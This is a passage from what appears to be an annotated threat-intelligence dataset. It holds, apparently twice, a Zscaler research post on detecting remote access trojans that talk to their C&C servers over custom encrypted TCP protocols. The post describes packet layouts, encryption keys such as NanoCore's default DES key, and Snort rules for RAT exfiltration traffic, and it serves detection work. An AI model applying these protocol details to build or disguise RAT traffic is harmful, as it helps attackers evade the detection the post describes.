detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0089,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; 